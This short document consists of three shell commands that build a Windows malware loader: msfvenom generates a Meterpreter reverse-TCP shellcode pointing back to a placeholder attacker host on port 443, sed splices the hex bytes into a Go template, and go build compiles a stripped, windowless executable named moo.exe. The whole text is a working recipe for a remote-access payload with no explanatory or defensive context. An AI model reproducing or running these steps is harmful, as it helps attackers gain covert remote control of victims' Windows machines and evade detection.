msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=443   -f hex |  sed 's/../0x&/g' |  sed 's/.\{4\}/&, /g' > shellocode.txt
sed "s/SHELLYTIME/`cat shellocode.txt`/g" main.go > new.go
GO111MODULE=on GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H windowsgui" -o moo.exe new.go 
